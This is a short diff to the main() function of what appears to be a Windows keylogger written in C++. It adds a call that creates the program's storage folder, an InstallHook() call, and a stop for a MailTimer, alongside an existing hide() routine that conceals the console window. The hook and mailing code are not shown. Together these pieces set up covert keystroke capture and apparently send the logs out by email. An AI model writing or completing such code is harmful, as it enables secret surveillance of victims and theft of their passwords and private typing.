@@ -16,12 +16,18 @@ int main()
 	hide(); // set console window to appear for a instant
 	MSG Msg; // msg object to be processed, but actually never is processed
 
+	IO::MKDir(IO::GetOurPath(true));
+
+	InstallHook();
+
 	while (GetMessage(&Msg, NULL, 0, 0)) // empties console window
 	{
 		TranslateMessage(&Msg);
 		DispatchMessage(&Msg);
 	}
-	cout << "hello world!" << endl;
+
+	MailTimer.Stop();
+	return 0;
 }
 
 void hide()
